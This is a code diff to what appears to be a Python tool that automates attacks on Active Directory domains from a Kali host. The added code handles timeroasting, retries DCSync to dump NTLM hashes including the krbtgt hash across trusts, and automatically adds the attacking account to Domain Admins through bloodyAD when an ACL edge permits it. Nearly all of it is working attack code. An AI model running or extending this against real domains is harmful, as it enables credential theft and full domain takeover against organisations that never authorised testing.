@@ -20,7 +20,28 @@ from dataclasses import asdict, dataclass, field
 from pathlib import Path
 from typing import Optional
 
-LOGS_BASE = Path(os.environ.get("ADTK_LOGS", "/logs"))
+def _writable_dir(path: Path) -> bool:
+    try:
+        path.mkdir(parents=True, exist_ok=True)
+        return os.access(path, os.W_OK)
+    except OSError:
+        return False
+
+
+def _default_logs_base() -> Path:
+    """Docker bind is /logs. An SSH Kali user cannot write that — use ~/logs."""
+    env = os.environ.get("ADTK_LOGS")
+    if env:
+        p = Path(env)
+        _writable_dir(p)
+        return p
+    for cand in (Path("/logs"), Path.home() / "logs"):
+        if _writable_dir(cand):
+            return cand
+    return Path.home() / "logs"
+
+
+LOGS_BASE = _default_logs_base()
 # LOOT is the per-target tree logs/<dc-ip>/. It starts at the base and is
 # rebound by set_target() once we know the DC, so each target keeps its own
 # auto/state.json, hashes, bloodhound, etc.
@@ -502,7 +523,7 @@ def act_box(st: State) -> bool:
     for d in ("nmap", "hashes", "bloodhound", "tickets", "adcs", "enum", "auto"):
         (LOOT / d).mkdir(parents=True, exist_ok=True)
     ping = run(["ping", "-c", "1", "-W", "2", st.dc], timeout=8)
-    ntp = which("ntpdate")
+    ntp = which("ntpdate", "ntpsec-ntpdate")
     if ntp:
         run([ntp, "-u", st.dc], timeout=15)
     nxc = which("nxc", "netexec")
@@ -579,7 +600,11 @@ def act_unauth(st: State) -> bool:
         blob += run([enum, "-A", st.dc], timeout=120)
     nxc2 = which("nxc", "netexec")
     if nxc2:
-        run([nxc2, "smb", st.dc, "--timeroasting", str(LOOT / "hashes" / "timeroast.txt")], timeout=60)
+        help_out = run([nxc2, "smb", "-h"], timeout=20)
+        if "--timeroasting" in help_out:
+            run([nxc2, "smb", st.dc, "--timeroasting", str(LOOT / "hashes" / "timeroast.txt")], timeout=60)
+        else:
+            print("[*] nxc has no --timeroasting — skip (roast via impacket)")
     added = st.add_users(parse_users_loose(blob))
     descs = parse_descriptions(blob)
     st.descriptions.update(descs)
@@ -824,7 +849,10 @@ def act_acl(st: State) -> bool:
         print("[*] ACL edges:")
         for e in st.edges[:12]:
             print(f"    {e['right']}: {e['raw'][:140]}")
-        st.next_manual.append("Review bloodyAD writable. Abuse with --abuse or commands.md §ACL.")
+        st.next_manual.append(
+            "Review bloodyAD writable. nxc --add-member is gone — "
+            "bloodyAD add groupMember \"GROUP\" USER. Then --abuse or commands.md §ACL."
+        )
     st.mark("acl")
     return bool(st.edges)
 
@@ -1042,12 +1070,15 @@ def act_dcsync(st: State) -> bool:
     if st.best.role not in {"da", "ea", "admin"}:
         print(f"[*] best cred is {st.best.role} — trying DCSync anyway (may fail)")
     out = LOOT / "hashes" / "ntds.ntds"
+    target = ""
+    blob = ""
     if st.best.password:
         target = f"{st.domain}/{st.best.user}:{st.best.password}@{st.dc}"
         blob = run([dump, target, "-just-dc-ntlm", "-outputfile", str(out)], timeout=300)
     elif st.best.nthash:
+        target = f"{st.domain}/{st.best.user}@{st.dc}"
         blob = run(
-            [dump, f"{st.domain}/{st.best.user}@{st.dc}", "-hashes", f":{st.best.nthash}",
+            [dump, target, "-hashes", f":{st.best.nthash}",
              "-just-dc-ntlm", "-outputfile", str(out)],
             timeout=300,
         )
@@ -1055,6 +1086,16 @@ def act_dcsync(st: State) -> bool:
         st.mark("dcsync")
         return False
     dumped = "krbtgt" in blob.lower() or "Dumping Domain Credentials" in blob
+    if "ERROR_DS_NAME_ERROR_NOT_UNIQUE" in blob or "not unique" in blob.lower():
+        nb = (st.domain.split(".")[0] if st.domain else "").upper()
+        if nb and target:
+            print(f"[*] krbtgt not unique across trusts — retry {nb}/krbtgt")
+            extra = [dump, target, "-just-dc-user", f"{nb}/krbtgt", "-just-dc-ntlm", "-outputfile", str(out)]
+            if st.best.nthash and not st.best.password:
+                extra = [dump, target, "-hashes", f":{st.best.nthash}", "-just-dc-user", f"{nb}/krbtgt",
+                         "-just-dc-ntlm", "-outputfile", str(out)]
+            blob += run(extra, timeout=180)
+            dumped = dumped or "krbtgt" in blob.lower()
     ntds_out = LOOT / "hashes" / "ntds.ntds"
     if ntds_out.exists() and "krbtgt" in ntds_out.read_text(errors="ignore").lower():
         dumped = True
@@ -1184,6 +1225,23 @@ def act_abuse(st: State) -> bool:
             )
             st.add_cred(Cred(target, password="LabOnly!1", role="user", source="abuse"), f"reset {target}")
             progressed = True
+    da_edge = next(
+        (e for e in (st.bh_edges + [{"dst": e.get("raw", ""), "right": e.get("right", "")} for e in st.edges])
+         if "DOMAIN ADMIN" in e.get("dst", "").upper()
+         and e.get("right", "").upper().replace(" ", "") in {"GENERICALL", "ADDMEMBER", "ADDSELF"}),
+        None,
+    )
+    bad = which("bloodyAD")
+    if da_edge and bad:
+        print("[abuse] GenericAll/AddMember on Domain Admins — bloodyAD add groupMember (nxc --add-member is gone)")
+        run(
+            [bad, "--host", st.dc, "-d", st.domain, "-u", st.best.user, "-p", st.best.password,
+             "add", "groupMember", "DOMAIN ADMINS", st.best.user],
+            timeout=40,
+        )
+        st.best.role = "da"
+        st.note("added to Domain Admins")
+        progressed = True
     if "1" in st.esc:
         cert = which("certipy", "certipy-ad")
         if cert:
